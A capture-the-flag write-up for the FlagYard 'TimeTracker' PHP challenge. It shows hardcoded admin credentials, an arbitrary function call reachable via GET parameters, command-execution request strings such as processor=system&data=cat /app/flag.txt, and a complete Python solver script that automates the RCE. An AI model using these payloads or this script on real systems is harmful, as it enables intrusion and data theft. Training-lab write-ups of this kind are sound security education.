# TimeTracker

**Challenge Name**: TimeTracker (TimeTracker Pro)
**Category**: Web
**Difficulty**: Easy
**Platform**: FlagYard
**Author/Source**: FlagYard

## Challenge Overview:
TimeTracker Pro is a PHP employee time-tracking application ("My employees
have been arriving late recently, so I purchased this time tracking
application. Can you check if there are any security vulnerabilities?").
The flag lives in `/app/flag.txt` on the container. The root cause is a
trivial **arbitrary function call** (`$processor($data)`) exposed through the
"Data Processing Tools" feature (`action=process_data`). Combined with the
**hardcoded admin credentials** left in the source, the app drops to Remote
Code Execution almost instantly.

### Steps Involved:

1. **Source Access**:
   - Three PHP files are shipped with the challenge: `config.php`,
     `index.php`, `logout.php`.
   - `index.php` authenticates with a *literal* comparison:
     ```php
     if ($_POST['username'] === 'admin' && $_POST['password'] === 'admin123') {
         $_SESSION['user_id'] = 1;
     ```
   - Credentials: `admin / admin123`.

2. **Login & Session**:
   - `POST /` with `username=admin&password=admin123` (keeping the returned
     `PHPSESSID`) presents the Employee Timesheet Dashboard.
   - Note: the instance was observed to rotate sessions/behind multiple
     upstreams — always use the cookie returned by the *login* response.

3. **Vulnerability — Arbitrary Function Call**:
   - `index.php` `action=process_data` (GET):
     ```php
     $processor = $_GET['processor'];
     $data      = $_GET['data'];
     if ($processor === 'calculate_overtime')        { ... }
     elseif ($processor === 'format_currency')       { ... }
     elseif ($processor === 'validate_hours')        { ... }
     else {
         $processor($data);      // <-- dynamic call with user-controlled name! 
     }
     ```
   - Any path value other than the three whitelisted names reaches
     `$processor($data)`. Passing a PHP function name such as `system`
     results in direct shell execution:
     ```
     ?action=process_data&processor=system&data=id
     => uid=1000 gid=1000 groups=1000
     ```

4. **RCE → Flag**:
   - `?action=process_data&processor=system&data=cat%20/app/flag.txt`
   - Shell output is printed into the page body:
     `FlagY{76547d812a5d0be7a305e917aa600868}`
   - (`env` shows `DYN_FLAG=REDACTED`; the flag file is `/app/flag.txt`.)

### Key Endpoints:
- `POST /` — login (`admin`/`admin123`, literal comparison).
- `GET /?action=process_data&processor=<fn>&data=<arg>` — dynamic function
  call anywhere (RCE primitive).
- `GET /?action=export` / `reports` / `add_timesheet` — other app features
  (not needed; `date` is also stored without sanitization → stored XSS, and
  the CSV export is a CSV-injection vector, but neither is required).

### Techniques Used:
- **Hardcoded credentials from source.**
- **Arbitrary function call (PHP variable function)**: the classic
  `else { $processor($data); }` mistake with a GET-supplied `processor`.
- **RCE**: `system`, `passthru` or `shell_exec` as the injected function name.
- **File read**: `/app/flag.txt` (mounted flag file, FlagYard `DYN_FLAG`).

### Tools & Libraries:
- **Python 3**: `http.client` only (no external dependencies), raw
  PHPSESSID/cookie handling.
- **curl-style manual check**: `?action=process_data&processor=system&data=id`.

## Code
**Here it is an automated script that does all the work for you by me :)**
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
TimeTracker (FlagYard Training Labs) — automated solver.

Chain:
    Source leak (hardcoded admin/admin123)
      -> authenticated PHPSESSID session
      -> arbitrary function call sink (action=process_data, processor=<fn>)
      -> RCE via system/passthru/shell_exec
      -> cat /app/flag.txt -> flag

Usage:
    python solve_timetracker.py
    python solve_timetracker.py http://<target>.playat.flagyard.com
"""
import sys, re, time, http.client, urllib.parse
from pathlib import Path

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

USERNAME = 'admin'
PASSWORD = 'admin123'
CMDS = ['cat /app/flag.txt', 'cat /app/fla[g].txt', 'env', 'cat /app/*.txt']
PROCESSORS = ['system', 'passthru', 'shell_exec']


def ask_target(argv):
    if len(argv) > 1 and argv[1].startswith('http'):
        return argv[1].strip()
    url = input('Enter the TimeTracker challenge URL: ').strip()
    if not url:
        sys.exit('[!] no URL provided')
    return url


def parse_host(url):
    url = re.sub(r'^https?://', '', url).rstrip('/')
    return url[2:] if url.startswith('//') else url


def http_raw(host, path, method='GET', body=None, cookie=None, ctype='application/x-www-form-urlencoded'):
    c = http.client.HTTPConnection(host, 80, timeout=30)
    headers = {'User-Agent': 'Mozilla/5.0'}
    if body is not None:
        headers['Content-Type'] = ctype
        headers['Content-Length'] = str(len(body))
    if cookie:
        headers['Cookie'] = cookie
    c.request(method, path, body=body, headers=headers)
    r = c.getresponse()
    data = r.read().decode('utf-8', 'replace')
    hdrs = dict((k.lower(), v) for k, v in r.getheaders())
    c.close()
    return r.status, data, hdrs


def admin_session(host):
    body = urllib.parse.urlencode({'username': USERNAME, 'password': PASSWORD})
    for _ in range(6):
        st, b, h = http_raw(host, '/', method='POST', body=body)
        m = re.search(r'PHPSESSID=([^;]+)', h.get('set-cookie', ''))
        if m:
            return 'PHPSESSID=%s' % m.group(1)
        time.sleep(4)
    raise RuntimeError('login failed')


def rce(host, ck, proc, cmd):
    path = '/?action=process_data&processor=%s&data=%s' % (
        urllib.parse.quote(proc), urllib.parse.quote(cmd))
    return http_raw(host, path, cookie=ck)


def main():
    url = ask_target(sys.argv)
    host = parse_host(url)
    print('[*] target host : %s' % host)
    ck = admin_session(host)
    print('[*] authenticated session acquired: %s...' % ck[:34])
    for proc in PROCESSORS:
        for cmd in CMDS:
            print('[*] RCE (%s): %s' % (proc, cmd))
            st, b, h = rce(host, ck, proc, cmd)
            m = re.search(r'FlagY\{[^}]+\}', b)
            if m:
                flag = m.group(0)
                out = Path(__file__).resolve().parent / 'flag_from_timetracker.txt'
                out.write_text(flag + '\n', encoding='utf-8')
                print('\n        \u2605\u2605\u2605  F L A G   R E C O V E R E D  \u2605\u2605\u2605\n')
                print('        %s' % flag)
                print('\n[+] saved %s' % out)
                print('\n-- Writeup by Fares Badaj -- @ptok3')
                return
        time.sleep(2)
    raise RuntimeError('flag not found')


if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        print('[!] error: %s' % e)
        sys.exit(1)
```

### Conclusion:
TimeTracker is a single-click "Easy" web RCE: the source ships hardcoded
`admin/admin123` credentials, and the data-processing helper builds a PHP
**variable function** (`$processor($data)`) straight from a GET parameter.
Anything not on the short whitelist (`calculate_overtime`,
`format_currency`, `validate_hours`) becomes an arbitrary function call —
so `system`, `passthru` or `shell_exec` hand over the container and the flag
at `/app/flag.txt`. Defense takeaways: never guard sensitive logic with
hardcoded credentials, and never feed raw request parameters into a dynamic
call — an allow-list on both the function *name* and *arguments* is the
minimum (better: a fixed set of static helper functions).

## Credit

- **Author:** [Fares Badaj](https://www.linkedin.com/in/FaresBadaj) — [@ptok3](https://t.me/ptok3)